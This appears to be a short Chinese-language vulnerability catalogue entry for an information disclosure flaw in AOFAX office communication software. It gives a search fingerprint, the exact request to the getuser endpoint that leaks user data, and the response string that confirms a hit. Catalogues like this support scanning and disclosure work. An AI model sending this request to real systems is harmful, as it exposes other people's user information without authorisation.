# AOFAX傲发办公通信专家getuser存在信息泄露漏洞

AOFAX ｜ 信息泄露 ｜ —
- **指纹**：`body="getincommingcall"`
- **请求**：`GET /handle/user.ashx?type=getuser HTTP/1.1`
- **响应特征**：200 “TripPhone”